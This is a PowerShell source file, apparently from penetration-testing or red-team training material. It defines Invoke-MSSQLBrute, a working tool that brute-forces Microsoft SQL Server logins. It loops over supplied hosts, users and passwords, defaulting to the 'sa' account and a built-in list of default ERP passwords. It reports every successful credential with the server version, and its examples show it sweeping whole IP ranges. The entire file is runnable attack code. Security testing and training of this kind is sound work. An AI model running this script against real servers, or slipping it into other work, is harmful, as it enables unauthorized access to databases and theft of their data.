Function Invoke-MSSQLBrute {
<#
.SYNOPSIS
    Performs brute-force attack against Microsoft SQL Server credentials
.DESCRIPTION
    It tries to login to specified hosts with provided credentials
.PARAMETER Hosts
    Hosts to try. Default port for MSSQL is 1433, if you have a host on another one 
    enter it using comma (not colon), for example: 172.16.100.10,1432
.PARAMETER Users
    Users array, default sa (superadmin)
.PARAMETER Passwords
    List of passwords to check, there are some default from few ERPs
.PARAMETER StopOnSuccess
    Stop trying other passwords for the host after first positive guess
.PARAMETER OnlyValid
    Show only valid passwords in verbose mode (don't show incorrect tries)
.INPUTS
    Hosts array
.OUTPUTS
    Array of objects with proporties: Host, User, Password, ServerVersion
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLBrute -Hosts 172.16.0.1 -Users sa,sasage -Passwords "","password","sa"
.EXAMPLE
    Invoke-MSSQLBrute -Hosts "sqlsrv.local","172.16.100.10,1432"
.EXAMPLE
    1..10 | % {"192.168.0.$_"} | Invoke-MSSQLBrute
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [String[]]$Hosts,
        [Parameter(Position = 1)]
        [String[]]$Users = "sa",
        [Parameter(Position = 2)]
        [String[]]$Passwords = ("", "sa", "password", "Comarch!2011", "reset2"),
        [Switch]$StopOnSuccess = $true,
        [Switch]$OnlyValid = $false
    )

    Begin {
        $Result = @()
        $stats = @{ hostcount = 0; tries = 0; found = 0 }
    }

    Process {
        ForEach ($_host in $Hosts) {
            Write-Verbose "[*] Trying host $_host"
            $stats.hostcount++
            :userLoop foreach ($_user in $Users) {
                ForEach ($_pass in $Passwords) {
                    $Connection = New-Object System.Data.SQLClient.SQLConnection
                    $Connection.ConnectionString = "Data Source=$_host;Persist Security Info=True;User ID=$_user;Password=$_pass"
                    try {
                        $stats.tries++
                        $Connection.Open()
                        $stats.found++
                        $o = New-Object -TypeName psobject 
                        $o | Add-Member -MemberType NoteProperty -Name Host -Value $_host
                        $o | Add-Member -MemberType NoteProperty -Name User -Value $_user
                        $o | Add-Member -MemberType NoteProperty -Name Password -Value $_pass
                        $o | Add-Member -MemberType NoteProperty -Name ServerVersion -Value $connection.ServerVersion
                        $result += $o
                        Write-Verbose "[+] $_user@$_host - '$_pass'" 
                        Write-Verbose "    Server version: $($connection.ServerVersion)"
                        if ($StopOnSuccess -eq $true) {
                            break :userLoop
                        }
                    }
                    catch [Exception] {
                        if ($OnlyValid -eq $false) {
                            Write-Verbose "[-] $_user@$_host - '$_pass'" 
                        }
                    }
                }
            }
        }
    }

    End {
        Write-Verbose "[*] Tried hosts: $($stats.hostcount), login attempts: $($stats.tries), successful: $($stats.found)"
        $Result
    }

}